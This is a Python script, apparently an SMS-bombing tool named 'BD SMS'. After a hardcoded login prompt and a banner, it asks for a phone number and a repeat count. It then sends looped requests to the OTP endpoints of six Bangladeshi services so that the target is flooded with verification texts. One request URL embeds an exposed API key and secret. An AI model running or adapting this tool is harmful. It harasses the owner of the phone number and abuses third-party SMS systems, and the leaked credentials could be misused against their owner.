import sys

print('\n'+'\033[1;31m'+' 	  	 This File is lock !'+'\033[0m'+'\n'+'\033[1;36m'+'    please!'+'\033[0m'+'\033[1;32m'+' Enter the correct username and password:'+'\033[0m')

n=5

while n<10:

	username="Arif"

	password="Arfat"

	

	

	intusername=str(input('\n'+'\033[1;33m'+'Enter The Username:'+'\033[0m'))

	intpassword=str(input('\033[1;33m'+'Enter The Password:'+'\033[0m'))

	

	if username==intusername and password==intpassword:

		print('\033[1;32m','\nLogin sussecful','\033[0m'+'(😍)')

		print('\n')

		break

		

	else:

		print('\033[1;31m','\nYour username or password is Wrong!','\033[0m'+'(😥)')

		print('\n')

		sys.exit()

		

		

#past main part

import requests

from requests.structures import CaseInsensitiveDict

import os

import sys

import time

os.system("pip install requests")

os.system("clear")

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

logo=(green+"""

  ___       _  __       _   _____     _                 

 / _ \     (_)/ _|     | | |_   _|   | |                

/ /_\ \_ __ _| |_ _   _| |   | |  ___| | __ _ _ __ ___  

|  _  | '__| |  _| | | | |   | | / __| |/ _` | '_ ` _ \ 

| | | | |  | | | | |_| | |  _| |_\__ \ | (_| | | | | | |

\_| |_/_|  |_|_|  \__,_|_|  \___/|___/_|\__,_|_| |_| |_|

                                         

                                     

                                    """)

line=(yellow+"======================================================")

tversion=(cyan+"\t\t     Version : 1.0.0 ")

line2=("\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~")

dtls=(yellow+"\t\tᴄʀᴇᴀᴛᴇᴅ ʙʏ : Avro Lx \n \t\t WE ARE ANONYMOUS ")

note=(red+"Note: I wont be responsible fo any illigal activites.")

print(logo)

print(" ")

print(dtls)

print(tversion)

print(line)

print(note)

print(line)

()

os.system("clear")

print(logo)

print(" ")

print(dtls)

print(tversion)

print(line)

print(note)

print(line)

print(lightblue+'\t\t If You Type [1] Sand it 3+ SMS')

print(' ')

number=str(input(red+"[➙] Enter Your Number [>]"))

amount=int(input(cyan+"[➙] Enter The Amount [>]"))

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()

headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number

url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()

headers2["Content-Type"] = "application/json"

headers2["Content-Length"] = "0"

url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers4 = CaseInsensitiveDict()

headers4["Content-Type"] = "application/json"

data4 = '{\"mobile\":\"'+number+'\"}'

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers5 = CaseInsensitiveDict()

headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "msisdn="+number

url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"

headers6 = CaseInsensitiveDict()

headers6["Content-Type"] = "application/json"

data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'

for i in range (amount):

        resp1 = requests.post(url1, headers=headers1, data=data1)

        resp2 = requests.post(url2, headers=headers2)

        resp3 = requests.get(url3)

        resp4 = requests.post(url4, headers=headers4,data=data4)

        resp5 = requests.post(url5, headers=headers5, data=data5)

        resp = requests.post(url6, headers=headers6, data=data6)

        print(str(i+1)+green+'. ➙Success Requests Sand ⏳⌛')

print('                                 ')

print(cyan+'\t\tThanks For Using BD SMS ')

os.system("Clear")
